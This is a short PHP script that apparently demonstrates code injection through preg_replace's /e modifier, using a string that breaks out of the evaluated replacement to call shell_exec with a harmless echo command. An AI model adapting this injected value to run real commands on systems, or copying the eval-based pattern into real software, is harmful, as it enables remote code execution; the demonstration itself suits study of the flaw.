#!/usr/bin/php
<?php
$a = "a";
$string = '");shell_exec("echo coucou");';
function y($m)
{
	print "coucou\n";
	print $m;
	print "\n";
	return 1;
}
print preg_replace('/^(.*)/e', 'y("\\1")', $string);
?>
